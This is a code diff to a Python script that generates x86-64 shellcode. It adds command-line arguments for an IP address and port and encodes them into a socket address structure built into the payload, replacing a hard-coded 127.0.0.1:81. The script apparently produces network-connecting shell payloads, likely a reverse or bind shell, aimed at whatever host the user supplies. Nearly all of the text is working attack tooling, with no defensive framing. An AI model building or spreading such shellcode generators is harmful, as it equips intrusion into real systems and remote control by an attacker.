@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 import struct
 import random
+import argparse
 
 
 def setRegToZero(reg):
@@ -237,16 +238,24 @@ def movRegtoReg(regsrc,regdst):
 
     return chunk
 
+parser = argparse.ArgumentParser(description="Generate shellcode with IP and port arguments")
+parser.add_argument("-i", "--ip", required=True, help="IP address")
+parser.add_argument("-p", "--port", required=True, help="Port number")
 
-ip = "127.0.0.1"
-port = "81"
+args = parser.parse_args()
+
+ip = args.ip
+port = args.port
 
 port = struct.pack("<h", int(port))
-print(port)
 ip = ip.split(".")
 ip = list(map(int,ip))
 ip = bytearray(ip)
-print(bytes(ip))
+ip = bytes(ip)
+ip = int.from_bytes(ip)
+ip = struct.pack("<i", ip)
+ip = int.from_bytes(ip)
+port = int.from_bytes(port)
 
 
 registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"rdi":7}
@@ -267,9 +276,9 @@ shellcode += movRegtoReg("rax","rdi")
 
 shellcode += movValueToReg("rax",0x0002)
 shellcode += movWORDToMemory(0,"rax")
-shellcode +=movValueToReg("rax",0x5100)
+shellcode +=movValueToReg("rax",port) #0x5100
 shellcode += movWORDToMemory(2,"rax")
-shellcode +=movValueToReg("rax",0x0100007f)
+shellcode +=movValueToReg("rax",ip) #0x0100007f
 shellcode += movDWORDToMemory(4,"rax")
 shellcode += setRegToZero("rax")
 shellcode += movQWORDToMemory(8,"rax")
